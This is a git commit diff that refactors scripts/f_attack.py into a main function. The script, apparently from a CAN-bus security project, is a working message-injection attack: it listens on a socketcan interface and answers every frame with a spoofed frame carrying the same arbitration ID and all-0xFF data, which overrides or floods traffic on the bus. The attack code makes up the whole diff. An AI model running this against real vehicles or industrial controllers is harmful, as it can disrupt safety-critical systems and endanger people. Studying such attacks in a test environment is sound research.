69f9b85ef6af32ac9bc4af1483a7563999e40aa3
JeakeG <123jakeguidry@gmail.com>
2024-03-11 15:21:32 -0500

    put script in main function

--- scripts/f_attack.py
+++ scripts/f_attack.py
@@ -1,6 +1,10 @@
 import can
 
-with can.Bus(interface="socketcan", channel="can0", recieve_own_messages=False) as bus:
-    for msg in bus:
-        new_msg = can.Message(arbitration_id=msg.arbitration_id, data=[0xff]*8)
-        bus.send(new_msg)
+def main():
+    with can.Bus(interface="socketcan", channel="can0", recieve_own_messages=False) as bus:
+        for msg in bus:
+            new_msg = can.Message(arbitration_id=msg.arbitration_id, data=[0xff]*8)
+            bus.send(new_msg)
+
+if __name__ == "__main__":
+    main()
